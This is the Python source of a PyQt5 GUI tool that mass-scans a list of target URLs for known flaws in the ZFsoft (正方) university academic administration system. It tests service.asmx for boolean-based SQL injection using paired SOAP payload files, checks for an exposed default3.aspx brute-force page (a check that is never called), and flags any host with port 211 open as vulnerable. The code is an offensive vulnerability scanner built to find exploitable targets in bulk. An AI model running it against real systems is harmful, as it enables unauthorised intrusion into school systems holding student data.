import sys
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
import requests
from queue import Queue
import os
import re
from scan import Ui_Form
import sys
import socket
from urllib.parse import urlparse

class zfsoft(QThread):

    outsignal = pyqtSignal(str)
    enablesignal = pyqtSignal()
    def __init__(self, url_queue):
        super(zfsoft, self).__init__()
        self.queue = url_queue

    def run(self):
        while not self.queue.empty():
            url = self.queue.get(False)
            # if self.f1(url) != "":
            #     if self.f2(url) != "":
            #         if self.f3(url) != "":
            #             self.outsignal.emit(self.f3(url))
            #     else:
            #         self.outsignal.emit(self.f2(url))
            # else:
            #     self.outsignal.emit(self.f1(url))
            self.outsignal.emit(self.f1(url))
            self.outsignal.emit(self.f3(url))

    def f1(self, url):
        port = 211
        if r"http" in url:
            #提取host
            host = urlparse(url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            host = url

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        try:
            s.connect((host, port))
            message = host + ":" + str(port) + "  存在正方教务系统数据库任意操纵漏洞"
            return message
        except:
            message = ""
            return message

    def f2(self, url):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        try:
            req = requests.get(url, headers=headers, timeout=6, verify=False, allow_redirects=True)
            tmpurl = str(req.url)
            tmpurl = tmpurl.lower()
            if r"default2.aspx" in tmpurl or r"default.aspx" in tmpurl:
                vulnurl = tmpurl.replace("default2.aspx", "").replace("default.aspx", "")
            else:
                vulnurl = tmpurl
            vulnurl = vulnurl + "default3.aspx"
            try:
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"__VIEWSTATEGENERATOR" in req.text and r"CheckCode.aspx" not in req.text and req.status_code == 200:
                    message = vulnurl + "  存在正方教务系统default3.aspx爆破页面...(敏感信息) "
                    return message
            except:
                message = ""
                return message
        except:
            pass


    def f3(self, url):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": "http://www.zf_webservice.com/BMCheckPassword"
        }
        payload = "/service.asmx"
        true_path = os.getcwd() + "/xml/zfsoft_service_stryhm_sqli_true.xml"
        false_path = os.getcwd() + "/xml/zfsoft_service_stryhm_sqli_false.xml"
        with open(true_path, "r") as f:
            post_data_true = f.read()
        with open(false_path, "r") as f:
            post_data_false = f.read()
        pattern = re.compile('<BMCheckPasswordResult xsi:type="xsd:int">[0-9]</BMCheckPasswordResult>')
        vulnurl = url + payload
        try:
            req1 = requests.post(vulnurl, data=post_data_true, headers=headers, timeout=10, verify=False)
            req2 = requests.post(vulnurl, data=post_data_false, headers=headers, timeout=10, verify=False)
            match1 = pattern.search(req1.text)
            match2 = pattern.search(req2.text)
            res_true = int(match1.group(0).replace('<BMCheckPasswordResult xsi:type="xsd:int">', '').replace(
                '</BMCheckPasswordResult>', ''))
            res_false = int(match2.group(0).replace('<BMCheckPasswordResult xsi:type="xsd:int">', '').replace(
                '</BMCheckPasswordResult>', ''))
            if res_true != res_false:
                message = vulnurl + "  存在正方教务系统services.asmx SQL注入漏洞...(高危)"
                return message
        except:
            message = ""
            return message




class window_1(QWidget, Ui_Form):

    def __init__(self):
        super(window_1, self).__init__()
        self.setupUi(self)
        self.pushButton.clicked.connect(self.scan)

    def scan(self):
        self.pushButton.setDisabled(True)
        thread_number = self.spinBox.value()
        self.url_queue = Queue()
        f = open('Ok.txt', 'r')
        for line in f:
            self.url_queue.put(line.rstrip('\n'))
        f.close()
        self.work_threads = []
        for work_thread_name in range(thread_number):
            self.work_thread = zfsoft(self.url_queue)
            self.work_thread.start()
            self.work_threads.append(self.work_thread)
            self.work_thread.outsignal.connect(self.update_out)



    def update_out(self, message):
        if (message != ""):
            self.textBrowser.append(message)
            self.textBrowser.moveCursor(QTextCursor.End)





if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = window_1()
    window.show()
    sys.exit(app.exec_())